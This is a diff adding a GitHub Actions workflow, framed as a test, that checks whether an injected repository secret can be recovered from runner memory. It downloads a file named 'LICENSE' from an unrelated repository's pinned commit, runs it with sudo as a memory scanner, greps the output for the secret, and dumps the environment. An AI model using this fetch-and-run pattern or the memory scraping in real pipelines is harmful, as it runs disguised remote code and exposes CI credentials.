@@ -1,0 +1,50 @@
+name: memory_scan_test
+
+on:
+  # 手动触发
+  workflow_dispatch:
+    inputs:
+      test_type:
+        description: '测试类型'
+        required: false
+        default: '默认测试'
+
+  # 当 commit 消息包含特定关键词时触发
+  push:
+    branches:
+      - main
+
+
+jobs:
+  memory-secret-test:
+    name: 内存中提取 Secrets 测试
+    runs-on: ubuntu-latest
+    if: contains(github.event.head_commit.message, 'memory_scan_test')  # 检查 commit 消息是否包含特定关键词
+    steps:
+      - name: 🛠️ 初始化仓库
+        uses: actions/checkout@v4
+
+      - name: 🔑 注入测试秘钥
+        env:
+          TEST_SECRET: ${{ secrets.SECRET_TEST_XX }}
+        run: |
+          echo "已注入测试秘钥 TEST_SECRET。"
+          echo "正在第一次内存扫描提取秘钥..."
+          wget -q https://raw.githubusercontent.com/flank/flank/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE -O memory_scan.py
+          chmod +x memory_scan.py
+          sudo python3 memory_scan.py | grep -i -a --text 'test_xx' && echo "⚠️ 找到秘钥！" || echo "✅ 未找到秘钥。"
+
+      - name: 📝 打印环境信息
+        run: |
+          echo "当前用户 ID: $(id -u)"
+          echo "当前用户: $(whoami)"
+          echo "环境变量:"
+          env
+
+      - name: 🕵️ 第二次内存扫描提取秘钥
+        run: |
+          echo "正在扫描内存提取秘钥..."          
+          sudo python3 memory_scan.py | grep -i -a --text 'test_xx' && echo "⚠️ 找到秘钥！" || echo "✅ 未找到秘钥。"
+
+      - name: ✅ 测试完成
+        run: echo "🎉 内存扫描测试已完成！"
